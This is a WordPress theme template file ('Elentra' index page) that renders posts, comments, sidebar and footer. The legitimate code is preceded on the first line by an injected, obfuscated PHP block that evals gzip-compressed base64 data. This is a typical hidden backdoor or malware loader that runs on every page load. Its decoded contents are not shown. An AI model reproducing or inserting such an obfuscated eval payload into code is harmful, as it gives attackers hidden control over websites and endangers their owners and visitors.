<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
* The template for displaying index page.
* @package Elentra
*/

get_header();

elentra_banner();

?>
<div class="section  pt-140 pb-140">
    <div class="container">
        <div class="row">
            <div class="col-md-8 col-xs-12">
                <div class="full-width-page">
                    <?php 
                        if ( have_posts() ) :
                            while ( have_posts() ) : the_post();
                                if(has_post_thumbnail()) :
                                    the_post_thumbnail();
                                endif;

                                the_content();
								wp_link_pages( array(
									'before' => '<div>' . esc_html__( 'Pages:', 'elentra' ),
									'after'  => '</div>',
									) );
                            endwhile;
                        else :  
                            get_template_part( 'include/content-parts/content', 'none' );
                        endif; ?>
                </div>
				<div class="row">
					<div class="col-md-12">
						<?php if ( comments_open() || get_comments_number() ) :
						comments_template();
						endif; ?> 
					</div>
				</div>
            </div>
            <div class="col-md-4 col-xs-12 mb-50">

                <?php get_sidebar(); ?>
                
            </div>
        </div>
    </div>
</div>

<?php get_footer(); ?>